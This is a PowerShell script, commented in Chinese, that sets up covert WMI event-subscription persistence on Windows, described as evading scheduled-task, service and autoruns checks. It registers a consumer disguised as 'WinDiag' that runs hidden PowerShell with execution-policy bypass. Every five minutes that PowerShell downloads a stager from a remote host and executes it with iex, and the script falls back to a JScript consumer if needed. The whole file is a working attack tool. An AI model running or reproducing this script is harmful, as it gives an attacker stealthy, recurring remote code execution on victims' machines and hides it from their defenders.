# wmi_persist.ps1 —— WMI 事件订阅驻留（避开计划任务/服务/autoruns 常规排查）
# 落地后每 5 分钟触发一次载荷；参数可自定义命令或远程脚本 URL
param(
    [string]$Command = '',
    [string]$Url = 'http://192.168.2.20:8090/delivery/stager_mem.ps1',
    [int]$IntervalMinutes = 5,
    [string]$FilterName = 'WinDiagTimer',
    [string]$ConsumerName = 'WinDiagConsumer',
    [string]$BindingName = 'WinDiagBinding'
)
$ErrorActionPreference = 'SilentlyContinue'

# 清理同名旧订阅
Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object Name -eq $FilterName | Remove-CimInstance
Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer | Where-Object Name -eq $ConsumerName | Remove-CimInstance

# 消费者：执行 PowerShell 拉取/执行
if ([string]::IsNullOrEmpty($Command)) {
    $inner = "powershell -nop -w hidden -ep bypass -c `"`$s=(New-Object Net.WebClient).DownloadString('$Url'); iex `$s`""
} else {
    $inner = "powershell -nop -w hidden -ep bypass -c `"$Command`""
}
$consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property @{
    Name = $ConsumerName
    CommandLineTemplate = $inner
} -ErrorAction Stop 2>$null
if (-not $consumer) {
    # 部分系统不允许直接建 CommandLineEventConsumer，退回 ActiveScriptEventConsumer
    $js = @"
var sh = new ActiveXObject('WScript.Shell');
sh.Run('$inner', 0, false);
"@
    $consumer = New-CimInstance -Namespace root\subscription -ClassName ActiveScriptEventConsumer -Property @{
        Name = $ConsumerName; ScriptingEngine = 'JScript'; ScriptText = $js
    } -ErrorAction Stop
}

# 过滤器：每 N 分钟（TimerEvent 无需外部事件源）
$q = "SELECT * FROM __InstanceModificationEvent WITHIN $($IntervalMinutes*60) WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property @{
    Name = $FilterName; QueryLanguage = 'WQL'; Query = $q
} -ErrorAction Stop

# 绑定
$bind = New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter = [wmi]$filter.__PATH
    Consumer = [wmi]$consumer.__PATH
} -ErrorAction Stop

Write-Host "[+] WMI 订阅已建立（每 $IntervalMinutes 分钟）"
Write-Host "    Filter:   $FilterName"
Write-Host "    Consumer: $ConsumerName"
Write-Host "    Binding:  $BindingName"
Write-Host "[i] 排查命令: Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding"
Write-Host "[i] 清理:  Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | ? Name -eq '$FilterName' | Remove-CimInstance"
